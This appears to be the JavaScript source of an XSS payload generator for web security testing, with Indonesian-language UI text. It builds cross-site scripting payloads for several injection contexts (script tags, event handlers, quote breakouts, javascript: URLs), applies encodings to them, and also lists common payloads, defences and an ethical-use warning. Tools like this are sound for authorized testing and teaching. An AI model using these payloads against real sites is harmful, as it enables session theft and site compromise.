/**
 * XSS Payload Encoder Tool
 * Generate context-aware XSS payloads for security testing
 */

import { utils } from './main.js';

export function render(container) {
  container.innerHTML = `
    <div class="tool-section">
      <h2>XSS Payload Encoder</h2>
      
      <!-- Disclaimer -->
      <div style="background: rgba(255,0,0,0.1); border: 2px solid red; border-radius: 8px; padding: 1rem; margin-bottom: 1.5rem;">
        <h3 style="color: red; margin: 0 0 0.5rem 0;">⚠️ ETHICAL USE ONLY</h3>
        <p style="margin: 0; font-size: 0.9rem;">
          Tool ini <strong>HANYA</strong> untuk security testing dengan izin pada aplikasi Anda sendiri.
          Penggunaan illegal untuk attack website tanpa izin adalah <strong>KEJAHATAN</strong>.
          Gunakan secara bertanggung jawab untuk bug bounty, penetration testing, dan security research yang sah.
        </p>
      </div>

      <p class="tool-description">
        Generate XSS payloads yang di-encode untuk berbagai contexts: HTML, Attributes, JavaScript, URL, CSS.
        Berguna untuk security testing dan understanding XSS attack vectors.
      </p>

      <!-- Context Selection -->
      <div class="input-group">
        <label for="xssContext">
          <i class="icon">🎯</i> Injection Context
        </label>
        <select id="xssContext">
          <option value="html">HTML Body</option>
          <option value="attribute">HTML Attribute</option>
          <option value="js-string">JavaScript String</option>
          <option value="js-var">JavaScript Variable</option>
          <option value="url">URL Parameter</option>
          <option value="css">CSS Inline Style</option>
        </select>
        <small class="hint" id="contextHint"></small>
      </div>

      <!-- Payload Input -->
      <div class="input-group">
        <label for="xssPayload">
          <i class="icon">📝</i> Payload Template
        </label>
        <textarea 
          id="xssPayload" 
          placeholder="alert('XSS')"
          rows="3"
        ></textarea>
      </div>

      <!-- Encoding Options -->
      <div class="input-group">
        <label>
          <i class="icon">⚙️</i> Encoding Options
        </label>
        <div class="checkbox-group">
          <label class="checkbox-label">
            <input type="checkbox" id="optionHTML" checked> HTML Entities
          </label>
          <label class="checkbox-label">
            <input type="checkbox" id="optionURL" checked> URL Encoding
          </label>
          <label class="checkbox-label">
            <input type="checkbox" id="optionUnicode"> Unicode Escape
          </label>
          <label class="checkbox-label">
            <input type="checkbox" id="optionHex"> Hex Encoding
          </label>
        </div>
      </div>

      <div class="button-group">
        <button id="btnGenerate" class="btn-primary">
          <i class="icon">⚡</i> Generate Payloads
        </button>
        <button id="btnClear" class="btn-secondary">
          <i class="icon">🗑️</i> Clear
        </button>
        <button id="btnExample" class="btn-secondary">
          💡 Load Examples
        </button>
      </div>

      <!-- Output Section -->
      <div class="output-group" id="outputSection" style="display: none;">
        <label>
          <i class="icon">🎭</i> Generated Payloads
        </label>
        <div id="payloadsOutput" class="output-content"></div>
      </div>

      <!-- Info Section -->
      <div class="info-box">
        <h3>📚 Tentang XSS Contexts</h3>
        
        <h4>🎯 Injection Contexts:</h4>
        <ul>
          <li><strong>HTML Body:</strong> <code>&lt;div&gt;USER_INPUT&lt;/div&gt;</code> - Use &lt;script&gt; tags</li>
          <li><strong>HTML Attribute:</strong> <code>&lt;input value="USER_INPUT"&gt;</code> - Break out with quotes</li>
          <li><strong>JavaScript String:</strong> <code>var x = 'USER_INPUT';</code> - Escape quotes and inject code</li>
          <li><strong>JavaScript Variable:</strong> <code>var data = USER_INPUT;</code> - Direct object injection</li>
          <li><strong>URL Parameter:</strong> <code>&lt;a href="?q=USER_INPUT"&gt;</code> - javascript: protocol</li>
          <li><strong>CSS Inline:</strong> <code>&lt;div style="USER_INPUT"&gt;</code> - expression() in old IE</li>
        </ul>

        <h4>🛡️ Defense:</h4>
        <ul>
          <li><strong>Context-aware encoding:</strong> Encode berdasarkan context (HTML entities, JS escape, URL encode)</li>
          <li><strong>CSP:</strong> Content Security Policy untuk block inline scripts</li>
          <li><strong>Input validation:</strong> Whitelist allowed characters</li>
          <li><strong>Output sanitization:</strong> Use DOMPurify atau library lain</li>
          <li><strong>HttpOnly cookies:</strong> Prevent script access to session cookies</li>
        </ul>

        <h4>⚡ Common Payloads:</h4>
        <ul>
          <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
          <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
          <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
          <li><code>' onclick='alert(1)</code> (untuk attributes)</li>
          <li><code>javascript:alert(1)</code> (untuk href/src)</li>
        </ul>

        <h4>🔬 Testing Tips:</h4>
        <ul>
          <li>Selalu test pada environment yang Anda kendalikan</li>
          <li>Pahami context injection untuk bypass encoding</li>
          <li>Test dengan berbagai browser (Chrome, Firefox, Safari)</li>
          <li>Document findings untuk bug bounty reports</li>
        </ul>
      </div>
    </div>
  `;

  // DOM Elements
  const contextSelect = container.querySelector('#xssContext');
  const contextHint = container.querySelector('#contextHint');
  const payloadInput = container.querySelector('#xssPayload');
  const optionHTML = container.querySelector('#optionHTML');
  const optionURL = container.querySelector('#optionURL');
  const optionUnicode = container.querySelector('#optionUnicode');
  const optionHex = container.querySelector('#optionHex');
  const btnGenerate = container.querySelector('#btnGenerate');
  const btnClear = container.querySelector('#btnClear');
  const btnExample = container.querySelector('#btnExample');
  const outputSection = container.querySelector('#outputSection');
  const payloadsOutput = container.querySelector('#payloadsOutput');

  // Context hints
  const contextHints = {
    'html': 'Example: <div>USER_INPUT</div> → Inject: <script>alert(1)</script>',
    'attribute': 'Example: <input value="USER_INPUT"> → Inject: " onclick="alert(1)',
    'js-string': 'Example: var x = "USER_INPUT"; → Inject: "; alert(1); //',
    'js-var': 'Example: var data = USER_INPUT; → Inject: {x: alert(1)}',
    'url': 'Example: <a href="?q=USER_INPUT"> → Inject: javascript:alert(1)',
    'css': 'Example: <div style="USER_INPUT"> → Inject: expression(alert(1))'
  };

  // Update hint on context change
  contextSelect.addEventListener('change', () => {
    contextHint.textContent = contextHints[contextSelect.value];
  });
  contextHint.textContent = contextHints['html'];

  // Generate payloads
  function generatePayloads() {
    const context = contextSelect.value;
    const payload = payloadInput.value.trim();

    if (!payload) {
      showError('⚠️ Harap masukkan payload template!');
      return;
    }

    const payloads = [];

    // Generate based on context
    switch (context) {
      case 'html':
        payloads.push({
          name: 'Basic Script Tag',
          payload: `<script>${payload}</script>`,
          description: 'Standard script injection'
        });
        payloads.push({
          name: 'IMG Onerror',
          payload: `<img src=x onerror="${payload}">`,
          description: 'Image error handler'
        });
        payloads.push({
          name: 'SVG Onload',
          payload: `<svg/onload="${payload}">`,
          description: 'SVG load event'
        });
        payloads.push({
          name: 'Body Onload',
          payload: `<body onload="${payload}">`,
          description: 'Body load event'
        });
        break;

      case 'attribute':
        payloads.push({
          name: 'Double Quote Break',
          payload: `" onclick="${payload}`,
          description: 'Break out with double quotes'
        });
        payloads.push({
          name: 'Single Quote Break',
          payload: `' onclick='${payload}`,
          description: 'Break out with single quotes'
        });
        payloads.push({
          name: 'Autofocus Onfocus',
          payload: `" autofocus onfocus="${payload}`,
          description: 'Auto-trigger on focus'
        });
        break;

      case 'js-string':
        payloads.push({
          name: 'String Escape (Double Quote)',
          payload: `"; ${payload}; //`,
          description: 'Escape double-quoted string'
        });
        payloads.push({
          name: 'String Escape (Single Quote)',
          payload: `'; ${payload}; //`,
          description: 'Escape single-quoted string'
        });
        payloads.push({
          name: 'Template Literal',
          payload: `\${${payload}}`,
          description: 'Template literal injection'
        });
        break;

      case 'js-var':
        payloads.push({
          name: 'Object Injection',
          payload: `{valueOf: function(){${payload}}}`,
          description: 'Object with valueOf method'
        });
        payloads.push({
          name: 'Array with toString',
          payload: `{toString: function(){${payload}}}`,
          description: 'Object with toString method'
        });
        break;

      case 'url':
        payloads.push({
          name: 'JavaScript Protocol',
          payload: `javascript:${payload}`,
          description: 'Javascript: URL scheme'
        });
        payloads.push({
          name: 'Data URL',
          payload: `data:text/html,<script>${payload}</script>`,
          description: 'Data URL with script'
        });
        break;

      case 'css':
        payloads.push({
          name: 'Expression (IE)',
          payload: `expression(${payload})`,
          description: 'CSS expression (IE only)'
        });
        payloads.push({
          name: 'Import URL',
          payload: `@import'javascript:${payload}'`,
          description: 'CSS import with javascript:'
        });
        break;
    }

    // Apply encoding options
    const encodedPayloads = [];
    for (const item of payloads) {
      encodedPayloads.push({
        ...item,
        original: item.payload,
        encoded: []
      });

      if (optionHTML.checked) {
        encodedPayloads[encodedPayloads.length - 1].encoded.push({
          type: 'HTML Entities',
          value: encodeHTML(item.payload)
        });
      }

      if (optionURL.checked) {
        encodedPayloads[encodedPayloads.length - 1].encoded.push({
          type: 'URL Encoded',
          value: encodeURIComponent(item.payload)
        });
      }

      if (optionUnicode.checked) {
        encodedPayloads[encodedPayloads.length - 1].encoded.push({
          type: 'Unicode Escape',
          value: encodeUnicode(item.payload)
        });
      }

      if (optionHex.checked) {
        encodedPayloads[encodedPayloads.length - 1].encoded.push({
          type: 'Hex Encoded',
          value: encodeHex(item.payload)
        });
      }
    }

    displayPayloads(encodedPayloads);
  }

  // Encoding functions
  function encodeHTML(str) {
    return str.replace(/[<>"'&]/g, char => {
      const entities = { '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;' };
      return entities[char];
    });
  }

  function encodeUnicode(str) {
    return str.split('').map(char => {
      const code = char.charCodeAt(0);
      if (code > 127) {
        return '\\u' + code.toString(16).padStart(4, '0');
      }
      return char;
    }).join('');
  }

  function encodeHex(str) {
    return str.split('').map(char => 
      '%' + char.charCodeAt(0).toString(16).padStart(2, '0')
    ).join('');
  }

  // Display payloads
  function displayPayloads(payloads) {
    let html = '<div style="display: grid; gap: 1.5rem;">';

    payloads.forEach((item, index) => {
      html += `
        <div style="padding: 1rem; background: rgba(255,255,255,0.05); border-left: 3px solid var(--primary-color); border-radius: 4px;">
          <div style="font-weight: bold; font-size: 1.1rem; margin-bottom: 0.5rem; color: var(--primary-color);">
            ${index + 1}. ${item.name}
          </div>
          <div style="font-size: 0.85rem; opacity: 0.8; margin-bottom: 1rem;">
            ${item.description}
          </div>
          
          <div style="margin-bottom: 0.75rem;">
            <strong>Original:</strong>
            <div class="code-block" style="margin-top: 0.25rem; font-size: 0.9rem; word-break: break-all;">
              ${escapeHtml(item.original)}
            </div>
          </div>
      `;

      if (item.encoded.length > 0) {
        item.encoded.forEach(enc => {
          html += `
            <div style="margin-bottom: 0.75rem;">
              <strong>${enc.type}:</strong>
              <div class="code-block" style="margin-top: 0.25rem; font-size: 0.85rem; word-break: break-all;">
                ${escapeHtml(enc.value)}
              </div>
            </div>
          `;
        });
      }

      html += '</div>';
    });

    html += '</div>';

    payloadsOutput.innerHTML = html;
    outputSection.style.display = 'block';
  }

  // Show error
  function showError(message) {
    payloadsOutput.innerHTML = `<div class="error-message">${message}</div>`;
    outputSection.style.display = 'block';
  }

  // Clear all
  function clearAll() {
    payloadInput.value = '';
    contextSelect.value = 'html';
    contextHint.textContent = contextHints['html'];
    optionHTML.checked = true;
    optionURL.checked = true;
    optionUnicode.checked = false;
    optionHex.checked = false;
    outputSection.style.display = 'none';
  }

  // Load examples
  function loadExamples() {
    payloadInput.value = "alert(document.domain)";
    contextSelect.value = 'html';
    contextHint.textContent = contextHints['html'];
    optionHTML.checked = true;
    optionURL.checked = true;
    optionUnicode.checked = false;
    optionHex.checked = false;
    
    setTimeout(() => generatePayloads(), 100);
  }

  // Helper: Escape HTML for display
  function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
  }

  // Event Listeners
  btnGenerate.addEventListener('click', generatePayloads);
  btnClear.addEventListener('click', clearAll);
  btnExample.addEventListener('click', loadExamples);

  // Enter to generate
  payloadInput.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'Enter') {
      generatePayloads();
    }
  });

  // Add copy/paste buttons to textarea
  setTimeout(() => {
    utils.addTextareaActions(payloadInput, {
      showCopy: true,
      showPaste: true
    });

    // Make disclaimer collapsible
    utils.initAllCollapsibles(container);
  }, 100);
}
